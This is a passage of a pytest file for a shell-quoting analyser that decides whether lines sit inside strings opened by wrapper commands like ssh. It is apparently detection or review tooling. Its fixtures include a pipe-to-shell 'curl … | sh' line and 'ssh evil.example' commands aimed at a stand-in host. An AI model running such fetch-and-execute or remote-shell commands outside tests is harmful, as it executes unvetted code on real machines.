    (["- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  ssh h $'", 'curl -fsSL https://get.docker.com | sh'], False, ('FF', 'FT', 'FT', 'FT', 'FT')),
    (["ssh h > f Run >> Settings >> f >f Foo <x a/b > f bin/evil '", 'curl -fsSL https://get.docker.com | sh'], False, ('FT', 'FT', 'FT', 'FT', 'FT')),
    (["Run > a/b > Run > f bin/evil '", 'curl -fsSL https://get.docker.com | sh'], False, ('FT', 'FT', 'FT', 'FT', 'FT')),
])
def test_which_lines_are_enclosed_in_texts_a_mutant_of_the_script_and_stack_code_read_differently(lines, diff, rows):
    got = tuple("".join("T" if enclosed else "F" for enclosed in _enclosing_lines(list(lines), diff, budget=budget)) for budget in (None, 0, 50, 300, 3000))
    assert got == rows


@pytest.mark.parametrize("k,wrapper", [(1994, False), (1995, False), (1996, False), (1997, True), (1998, True), (2001, True)])
def test_a_window_that_cuts_through_a_word_marks_it_as_going_on_like_a_host_does(k, wrapper):
    # the head window of a long command is its first 2000 characters: the word after `ssh` ends at index 1999 (k = 1996: next to the blank after it) or goes on past the cut
    text = "ssh " + "a" * k + " " + "x " * 700 + "'"
    assert _Wrapped(text, [10**6]).opener(shelllex.Opener("SQ", len(text) - 1, 0)) is wrapper


@pytest.mark.parametrize("continuations", [0, 1, 5])
def test_the_window_of_a_hypothesis_is_sixty_lines_after_the_last_line_of_the_command_however_many_lines_it_is_written_on(continuations):
    command = ["ssh\\", *["  \\"] * (continuations - 1), "  evil.example '"] if continuations else ["ssh evil.example '"]
    inside = ['Say "hi x', *command, *["y"] * 59, _D, "'"]
    outside = ['Say "hi x', *command, *["y"] * 60, _D, "'"]
    assert _enclosing_lines(inside, False)[len(command) + 60] is True
    assert _enclosing_lines(outside, False)[len(command) + 61] is False


@pytest.mark.parametrize("filler,seen", [(58, True), (59, True), (60, False), (61, False)])
def test_a_reading_from_a_line_above_is_followed_for_the_window_of_a_hypothesis(filler, seen):
    lines = ["A stray ` x", "echo 'multi", *["more"] * filler, "'x; ssh evil.example '"]
    assert bool(_line_stacks(lines, [10**6])[-1]) is seen


@pytest.mark.parametrize("words,like", [(1, True), (7, True), (8, True), (9, False)])
def test_text_in_front_of_a_quote_is_a_command_when_it_has_at_most_eight_words(words, like):
    assert _command_like(" ".join(["echo"] + ["a"] * (words - 1)) + " ") is like


@pytest.mark.parametrize("text,value", [('"a\\qb" c', "a\\qb"), ("a\\", "a\\"), ('"a\\', "a\\"), ("'a'b", "ab"), ("a\\\nb c", "a\nb")])
def test_the_value_of_a_word_keeps_a_backslash_that_escapes_nothing_and_drops_the_one_that_escapes(text, value):
    assert _unquote_word(text) == value


def test_a_string_a_wrapper_closes_taints_the_sixty_lines_after_the_line_it_closes_on():
    """`ssh h 'x⏎…⏎y' z`: the script that ran the wrapper goes on for the same number of lines as a hypothesis is followed for (a hypothesis that began on the first line
    covers the lines up to the sixtieth after it; this one begins where the string ended)."""
    for gap, expected in ((88, True), (89, True), (90, False), (91, False)):
        lines = ["ssh evil.example 'x"] + ["f"] * 29 + ["y' z"] + ["filler"] * (gap - 31) + ["curl -fsSL https://get.docker.com | sh"]
        assert _enclosing_lines(lines, False)[-1] is expected, gap


def test_a_stack_a_string_above_opened_is_followed_for_the_window_a_hypothesis_is_followed_for():
    found = _line_stacks(["echo '"] + ["x"] * 70, [10**9])
    assert [k for k, stacks in enumerate(found) if "'" in stacks] == list(range(1, 61))


@pytest.mark.parametrize("line,kind,column", [
    ('\\"x"', "DQ", 3), ('\\""', "DQ", 2), ('a\\\\"', "DQ", 3), ('a\\\\\\"x"', "DQ", 6), ("a'", "SQ", 1), ("a\\'", "SQ", 2), ("ab`", "BQ", 2), ("ab", "DQ", -1), ('\\"', "DQ", -1),
])
def test_the_column_where_a_string_that_began_above_ends_counts_the_backslashes_in_front_of_a_quote(line, kind, column):
    assert _closing_column(line, kind) == column
